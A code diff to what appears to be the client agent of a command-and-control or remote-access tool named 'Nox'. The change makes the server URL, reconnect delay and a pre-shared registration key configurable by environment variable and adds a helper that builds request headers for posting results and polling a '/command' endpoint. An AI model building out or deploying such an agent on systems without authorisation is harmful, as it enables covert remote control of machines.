@@ -16,22 +16,31 @@ from download_handler import handle_download_file
 
 
 
-SERVER_URL = "http://127.0.0.1:8080"
-RECONNECT_DELAY = 3
-
+SERVER_URL = os.getenv("NOX_SERVER_URL", "http://127.0.0.1:8080")
+RECONNECT_DELAY = int(os.getenv("NOX_RECONNECT_DELAY", "3"))
+AGENT_KEY = os.getenv("NOX_AGENT_KEY", "")  # Pre-shared registration token (if configured)
 
 AGENT_ID = str(uuid.uuid4())
 
 
+def _build_headers(extra_headers=None):
+    headers = {
+        "X-UUID": AGENT_ID,
+    }
+    if AGENT_KEY:
+        headers["X-Agent-Key"] = AGENT_KEY
+    if extra_headers:
+        headers.update(extra_headers)
+    return headers
+
+
 def send_json(path, data):
     message_json = json.dumps(data)
+    headers = _build_headers({"Content-Type": "application/octet-stream"})
     request = Request(
         f"{SERVER_URL}{path}",
         data=message_json.encode("utf-8"),
-        headers={
-            "Content-Type": "application/octet-stream",
-            "X-UUID": AGENT_ID,
-        },
+        headers=headers,
         method="POST",
     )
 
@@ -44,9 +53,10 @@ def send_json(path, data):
 
 
 def get_command():
+    headers = _build_headers()
     request = Request(
         f"{SERVER_URL}/command",
-        headers={"X-UUID": AGENT_ID},
+        headers=headers,
         method="GET",
     )
 
